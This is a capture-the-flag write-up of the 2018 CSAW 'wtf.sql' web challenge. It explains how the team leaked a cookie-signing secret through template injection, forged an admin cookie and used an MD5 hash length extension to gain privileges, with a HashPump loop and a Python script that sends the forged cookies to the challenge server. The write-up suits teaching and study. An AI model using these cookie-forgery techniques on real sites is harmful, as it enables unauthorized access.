---
title: CSAW CTF Qualification - wtf.sql
authors: zap
date: 2018-09-18
categories: web-exploitation
---

This challange was from the CSAW Qualification round this year.  It consisted of a forum-like application on a webserver written almost entirely in SQL.
It was solved by zap, negasora and Hawkheart

>It is a period of civil war.  
Rebel hackers, striking  
from a hidden base, have won  
their first victory against  
the evil DBA.  
> 
> During the battle, Rebel  
spies managed to steal secret  
plans to the DBA's  
ultimate weapon, WTF.SQL,  
an integrated framework  
with enough buzzwords to  
host an entire website.  
> 
>Pursued by the DBA's  
sinister agents, You, the  
Player, race home aboard  
your VT100, custodian of the  
stolen schema that can save  
the animals and restore  
freedom to the internet.....  
> 
>Your mission is to read out  
the txt table in the flag  
database.  

#### Reconnaissance

Opening the challenge greets us with the following (retro) page:

![Homepage of wtf.sql][greeting_page]

If we look closely, there seems to be a reference to robots.txt.  Lets take a look:

```
User-agent: *
Disallow: / # procedure:index_handler
Disallow: /admin # procedure:admin_handler
Disallow: /login # procedure:login_handler
Disallow: /post # procedure:post_handler
Disallow: /register # procedure:register_handler
Disallow: /robots.txt # procedure:robots_txt_handler
Disallow: /static/% # procedure:static_handler
Disallow: /verify # procedure:verify_handler

## Yeah, we know this is contrived :(
```

Nice!  We now have some endpoints to look at.
After exploring a bit, the /verify endpoint looks like it could be interesting.

Browsing to  /verify in a webbrowser, leads us to this page:
![/verify- missing proc][blank_verify]

Proc is an interesting name for a parameter- lets supply some names we found from robots.txt; in fact, why not admin_handler?

```sql
BEGIN
    DECLARE u_email, table_name, rendered_table, html TEXT;
    DECLARE admin, can_view_panels, can_create_panels  BOOL;

    DECLARE done BOOLEAN;
    DECLARE panel_cur CURSOR FOR SELECT `tbl` FROM `panels` WHERE `email` = `u_email`;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

    CALL is_admin(admin);

    IF admin THEN
        CALL get_cookie('email', u_email);

        CALL has_priv('panel_create', can_create_panels);
        CALL has_priv('panel_view', can_view_panels);
...
...
END
```

It should be obvious, but we now have access to the server source code.  Awesome!

#### Cookie Authentication

Exploring the source code leads to a few functions of interest, relating to the implementation of authentication on wtf.sql:

verify_cookie:
```sql
BEGIN
    DECLARE secret, signature TEXT;
    SET secret = (SELECT `value` FROM `config` WHERE `name` = 'signing_key');
    
    SET signature = SUBSTR(signed_value FROM 1 FOR 64);
    SET cookie_value = UNHEX(SUBSTR(signed_value FROM 65));

    SET valid = (SELECT SHA2(CONCAT(cookie_value, secret), 256) = signature);
END
```


login:
```sql
BEGIN
    DECLARE is_admin BOOLEAN;
    DECLARE privs TEXT;

    SET is_admin = (SELECT `admin` FROM `users` WHERE `email` = `i_email`);
    CALL get_privs_cookie(i_email, privs);

    CALL set_cookie('admin', `is_admin`);
    CALL set_cookie('email', `i_email`);
    CALL set_cookie('privs', `privs`);
END
```

After analysing these files, it becomes clear what is going on-
On login, 3 cookie values are assigned: privs, admin, and email. Each value is signed with a SHA256 hash of its own value, concatenated with a secret hash, followed by the hex-encoded value of the cookie.

Visualizing the format for clarity:
```
Admin cookie:
    b06a105bfe5e9a84541b4fa83aa238db57a1267ac5367a204450c8249bf905db      30
   |---------------------------signature----------------------------|    |--|  <- hex encoding of '0'

signature is a 256 hash of:
thisisasecrethash0
where 'thisisasecrethash' is unknown to us.
```

So to pass the signature checks, we need to be able to sign our values.  This leads to an interesting condition- if we can leak the secret, or, if we can get the server to sign a value for us, we've got admin!

Lets create an account with the email set as the number '1' and plug it into our admin cookie, then try visiting the admin page:

![Replacing admin cookie for signature][getting_admin]

Success! We were able to get the server to sign the character '1', and inserting the signature into the admin cookie gives us a pass! However, there was another way- which we be discussed later on in this post.

#### Cookie Privileges

We got admin, but we see nothing!  Looking at the admin handler code, it looks for signed privileges too.  We're not done yet!

Following the has_priv function from the admin_handler, we find that the privileges are signed as follows:

has_priv:
```sql
BEGIN
    DECLARE privs, cur_privs, cmp_priv BLOB;
    DECLARE hash, signing_key TEXT;

    SET o_has_priv = FALSE;

    SET privs = NULL;
    CALL get_cookie('privs', privs);

    IF NOT ISNULL(privs) THEN
        SET hash = SUBSTR(privs FROM 1 FOR 32);
        SET cur_privs = SUBSTR(privs FROM 33);
        SET signing_key = (SELECT `value` FROM `priv_config` WHERE `name` = 'signing_key');

        IF hash = MD5(CONCAT(signing_key, cur_privs)) THEN
            WHILE ( LENGTH(cur_privs) > 0 ) DO
                SET cmp_priv = SUBSTRING_INDEX(cur_privs, ';', 1);
                IF cmp_priv = i_priv THEN
                    SET o_has_priv = TRUE;
                END IF;
                SET cur_privs = SUBSTR(cur_privs FROM LENGTH(cmp_priv) + 2);
            END WHILE;
        END IF;
    END IF;
END
```

It looks like the privilege cookie is being signed again, with a different secret value, using MD5 this time. A trained eye will realize something though- we have a hash of the secret value by itself, concatenated with our privileges (currently empty). Let's represent this visually again:
```
privs=
61adb96e3b0506f40eeb64d87790a41c0b404eac7f8617bdff94332ecd5a1b3a3630663063633634663562363333636635303264323565613536316139386266

 61adb96e3b0506f40eeb64d87790a41c0b404eac7f8617bdff94332ecd5a1b3a
|------------------------------SHA2------------------------------| (first 64 characters)

Then, hex decode all of the following characters:
'60f0cc64f5b633cf502d25ea561a98bf' <-- This is our hashed secret, and since we have no privileges, nothing follows right now.

'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;panel_create;panel_view;' <-- if we had permissions, this is what the hex decode would reveal- where the X's are the secret with ';panel_create;panel_view;' concatenated.
```
This looks like a classic [hash length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack). This setup allows us to append any data to the end of of a hashed value. This alters the original hash, but keeps the prefix to our data intact- allowing us to bypass the hash check.

For a hash length extension, we need to know how long the secret is- or, we can bruteforce that check. A bunch of programs can be used to calculate hash extensions, meaning we don't have to write it ourselves.  The one used in my solution script is using [HashPump](https://github.com/bwall/HashPump).

The script reads piped output from HashPump into a python array, and tries all secret lengths from 1 to 32.  Now all that's left is to sign our raw extended hash value with the secret value for the cookies, and we've bypassed it!  Let's give it a shot by using our admin cookie trick!

![The webserver didn't like that][cookie_sign_fail]


#### Finally leaking the secret value

Here is where we got stuck. Extending an MD5 hash requires the hex value 0x80, which is invalid ascii.  The webserver would just crash when it tried to process our request.  Hypothetically, our attack works- we just need a valid cookie signature, so we can sign arbitrary bytes instead of just printable ones.

Thus, we returned to the code. At this point, we've spent many hours on this challenge trying to get the webserver to accept our input through unicode trickery, and we were largely unsuccessful.

Returning to the website, we began looking for signs of XSS- after all, there is a template engine, and one written in SQL. We might be able to leak some data. Let's look at another SQL function:

template_string:
```sql
BEGIN
    DECLARE formatted TEXT;
    DECLARE fmt_name, fmt_val TEXT;
    DECLARE replace_start, replace_end, i INT;

    SET @template_regex = '\$\{[a-zA-Z0-9_ ]+\}';

    CREATE TEMPORARY TABLE IF NOT EXISTS `template_vars` (`name` VARCHAR(255) PRIMARY KEY, `value` TEXT);
    CALL populate_common_template_vars();

    SET formatted = template_s;
    SET i = 0;

    WHILE ( formatted REGEXP @template_regex AND i < 50 ) DO
        SET replace_start = REGEXP_INSTR(formatted, @template_regex, 1, 1, 0);
        SET replace_end = REGEXP_INSTR(formatted, @template_regex, 1, 1, 1);
        SET fmt_name = SUBSTR(formatted FROM replace_start + 2 FOR (replace_end - replace_start - 2 - 1));
        SET fmt_val = (SELECT `value` FROM `template_vars` WHERE `name` = TRIM(fmt_name));
        SET fmt_val = COALESCE(fmt_val, '');
        SET formatted = CONCAT(SUBSTR(formatted FROM 1 FOR replace_start - 1), fmt_val, SUBSTR(formatted FROM replace_end));
        SET i = i + 1;
    END WHILE;

    SET resp = formatted;

    DROP TEMPORARY TABLE `template_vars`;
END
```

populate_common_template_vars:
```sql
BEGIN
    INSERT INTO `template_vars` SELECT CONCAT('config_', name), value FROM `config`;
    INSERT INTO `template_vars` SELECT CONCAT('request_', name), value FROM `query_params`;
END
```

oh my goodness.  It was right there the whole time.  Looking at the regex, and the template vars, the secret value gets loaded into the template engine.  Lets try to inject into the name field!

![an_bad_secret_value_nhcq497y8][secret_value_leak]

Now that we have the secret value for the SHA signature, we can sign our cookie locally! We won't have to worry about crashing our web request with invalid unicode bytes anymore.

### Putting it all together


![It worked!][it_worked]


We finally have a plan of attack.  Make a request to /admin with our cookies set properly.  We aren't sure what the length of the privilege variable is, so we write a script to look for changes in the admin page when we try different lengths, and plug that cookie into our web browser after the fact.

To encode the priv cookie, we have to do a couple things:
1. Take the raw bytes of our extended hash, add the secret value on to the end.
2. SHA 256 the result.
3. Hex encode the raw bytes, and append them to the SHA hash.

The extra data and hash values are read from the piped output of HashPump, all we need to do is put everything together in the right order.

To generate the right file from hashpump:
```bash
#!/bin/bash
## Pipe output into extensions.txt
## HashPump doesn't like blank data, so just send EOFs while running
COUNTER=1
while [ $COUNTER -lt 33 ]; do
    echo $COUNTER
    TEST=$(hashpump -d "" -s 60f0cc64f5b633cf502d25ea561a98bf -a ";panel_create;panel_view;" -k $COUNTER)
    echo $TEST
    let COUNTER=$COUNTER+1
done
```

Solution script:
```python
import requests
import urllib
import time
import hashlib

## This file is piped output from hashpump
f = open("extensions.txt")
r = f.read()
lines = r.strip().split("\n")
for i in range(0, len(lines)/2):
    priv_hash = lines[2 * i + 1].split(" ")[2].strip()
    new_data = lines[2 * i + 1].split(" ")[3].strip().decode('string-escape')
    shaSigned = hashlib.sha256(priv_hash + new_data + "an_bad_secret_value_nhcq497y8").hexdigest()
    shaSigned += (priv_hash + new_data).encode('hex')
    time.sleep(0.1)
    url = "http://web.chal.csaw.io:3306/admin"
    print("Running number: " + lines[2*i].strip())
    headers = {"Cookie":"__cfduid=da3059a1c48c186f13d674aa4f307b2c81536954847; admin=3efb7d99e34432bb6405b6a95619978d4904a2f5b5d8d56b3702939c226d729431; email=260d3e9300ef347d2e0da1fe3f3cf9c9e203d997cec69915f39c33da1f680f667a6170313233; privs=" + shaSigned + ";"}

    response = requests.get(url, headers=headers)
    if(len(response.content) != 287):
        print "INTERESTING RESPONSE"
        print "Signed privs: " + shaSigned
        print response.text
        exit(0)
```

We can finally get to the admin panel!  Setting the proper cookies in the browser brings us here:

![flag!][flag]


During the competition the flag was already up, and afterwards the database query we were supposed to use doesn't seem to be functioning anymore.  However, looking at the dump html table function all that needed to be done was to type 'flag.txt' and add the panel:

dump_table_html:
```
BEGIN
    DECLARE db_name, tbl_name, cols TEXT;

    IF INSTR(i_table_name, '.') THEN
        SET db_name = SUBSTRING_INDEX(i_table_name, '.', 1);
        SET tbl_name = SUBSTR(i_table_name FROM INSTR(i_table_name, '.') + 1);
    ELSE
        SET db_name = DATABASE();
        SET tbl_name = i_table_name;
    END IF;

    SET cols = NULL;
    SET cols = (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE `table_schema` = `db_name` AND `table_name` = `tbl_name`);

    IF ISNULL(cols) THEN
        SET o_html = 'No such table';
    ELSE
        SET @dump_query = (SELECT CONCAT('SELECT CONCAT('<tr>', GROUP_CONCAT(CONCAT('<td>', CONCAT_WS('</td><td>', ', cols, '), '</td>') SEPARATOR '</tr><tr>'), '</tr>') INTO @dump_result FROM ', `i_table_name`, ';'));
        PREPARE prepped_query FROM @dump_query;
        EXECUTE prepped_query;

        SET cols = (SELECT CONCAT('<tr><td>', GROUP_CONCAT(column_name SEPARATOR '</td><td>'), '</td></tr>') FROM information_schema.columns WHERE `table_schema` = `db_name` AND `table_name` = `tbl_name`);
        SET o_html = CONCAT('<table>', cols, @dump_result, '</table>');
    END IF;
END
```

Flag captured!

[greeting_page]:{{ site.baseurl }}/assets/greeting_page.png
[flag]:{{ site.baseurl }}/assets/flag.png
[it_worked]:{{ site.baseurl }}/assets/collide_hash.gif
[cookie_sign_fail]:{{ site.baseurl }}/assets/cookie_sign_fail.png
[getting_admin]:{{ site.baseurl }}/assets/getting_admin.gif
[blank_verify]:{{ site.baseurl }}/assets/blank_verify.png
[secret_value_leak]:{{ site.baseurl }}/assets/secret_value_leak.png
